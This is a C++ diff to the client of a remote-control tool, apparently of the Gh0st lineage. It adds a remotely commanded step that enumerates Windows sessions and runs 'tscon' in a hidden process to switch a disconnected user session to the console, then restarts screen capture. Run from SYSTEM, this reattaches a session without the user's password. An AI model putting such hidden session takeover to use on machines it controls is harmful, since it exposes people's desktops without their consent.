@@ -22,8 +22,10 @@
 #include "ClientDll.h"
 #include <common/iniFile.h>
 #include "KernelManager.h"
+#include <wtsapi32.h>
 
 #pragma comment(lib, "Shlwapi.lib")
+#pragma comment(lib, "wtsapi32.lib")
 
 #ifdef _WIN64
 #ifdef _DEBUG
@@ -243,6 +245,108 @@ BOOL IsProcessRunningInDesktop(HDESK hDesk, const char* targetExeName)
     }, reinterpret_cast<LPARAM>(&data));
 
     return bFound;
+}
+
+// 检查当前进程是否以管理员身份运行
+static BOOL IsRunningAsAdmin()
+{
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+
+    if (AllocateAndInitializeSid(&ntAuthority, 2,
+            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+            0, 0, 0, 0, 0, 0, &adminGroup)) {
+        CheckTokenMembership(NULL, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    return isAdmin;
+}
+
+// 恢复控制台会话（解决 RDP 断开后黑屏问题）
+// 当用户通过 RDP 连接后断开，物理控制台可能处于 Disconnected 状态
+// 此函数检测并将活跃的 RDP 会话切换回控制台
+// 需要 SYSTEM 或管理员权限
+static BOOL RestoreConsoleSession()
+{
+    // 权限检查：需要 SYSTEM 或管理员权限
+    if (!IsRunningAsSystem() && !IsRunningAsAdmin()) {
+        Mprintf("[RestoreConsole] Insufficient privileges (need SYSTEM or Admin)\n");
+        return FALSE;
+    }
+
+    // 获取当前进程的会话ID
+    DWORD currentSessionId = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
+    Mprintf("[RestoreConsole] Current process session: %d\n", currentSessionId);
+
+    PWTS_SESSION_INFO pSessionInfo = NULL;
+    DWORD dwCount = 0;
+    DWORD targetSessionId = 0;
+    BOOL foundTarget = FALSE;
+    BOOL currentSessionDisconnected = FALSE;
+
+    if (!WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &dwCount)) {
+        Mprintf("[RestoreConsole] WTSEnumerateSessions failed: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    // 分析会话状态
+    for (DWORD i = 0; i < dwCount; i++) {
+        DWORD sid = pSessionInfo[i].SessionId;
+        WTS_CONNECTSTATE_CLASS state = pSessionInfo[i].State;
+        const char* name = pSessionInfo[i].pWinStationName;
+
+        Mprintf("[RestoreConsole] Session %d (%s): State=%d\n", sid, name, state);
+
+        // 如果当前进程在用户会话中（非Session 0），检查该会话是否断开
+        if (currentSessionId != 0 && sid == currentSessionId) {
+            if (state == WTSDisconnected) {
+                currentSessionDisconnected = TRUE;
+                targetSessionId = sid;
+                foundTarget = TRUE;
+                Mprintf("[RestoreConsole] Current session %d is disconnected\n", sid);
+            }
+        }
+        // 如果进程在Session 0（SYSTEM服务），查找断开的用户会话
+        else if (currentSessionId == 0 && state == WTSDisconnected && sid != 0 && sid < 65536) {
+            // 优先选择最小的会话ID（通常是用户的主会话）
+            if (!foundTarget || sid < targetSessionId) {
+                targetSessionId = sid;
+                foundTarget = TRUE;
+                Mprintf("[RestoreConsole] Found disconnected user session %d\n", sid);
+            }
+        }
+    }
+
+    WTSFreeMemory(pSessionInfo);
+
+    // 如果找到需要恢复的会话，执行 tscon 切换到控制台
+    if (foundTarget) {
+        char cmd[128];
+        sprintf(cmd, "tscon %d /dest:console", targetSessionId);
+        Mprintf("[RestoreConsole] Executing: %s\n", cmd);
+
+        STARTUPINFO si = { sizeof(si) };
+        PROCESS_INFORMATION pi = { 0 };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+
+        if (CreateProcess(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, 5000);
+            SAFE_CLOSE_HANDLE(pi.hProcess);
+            SAFE_CLOSE_HANDLE(pi.hThread);
+            Mprintf("[RestoreConsole] Session %d restored to console\n", targetSessionId);
+            Sleep(200);  // 等待桌面切换完成
+            return TRUE;
+        } else {
+            Mprintf("[RestoreConsole] CreateProcess failed: %d\n", GetLastError());
+        }
+    } else {
+        Mprintf("[RestoreConsole] No disconnected session to restore\n");
+    }
+
+    return FALSE;
 }
 
 void CScreenManager::InitScreenSpy()
@@ -721,6 +825,14 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             memcpy(m_QualityProfiles, szBuffer + 1, sizeof(QualityProfile) * QUALITY_COUNT);
             SaveQualityProfiles();
             Mprintf("收到质量配置更新\n");
+        }
+        break;
+    }
+    case CMD_RESTORE_CONSOLE: {
+        // RDP会话归位（恢复控制台会话）
+        if (RestoreConsoleSession()) {
+            // 成功后重启截屏线程以获取新的桌面句柄
+            RestartScreen();
         }
         break;
     }
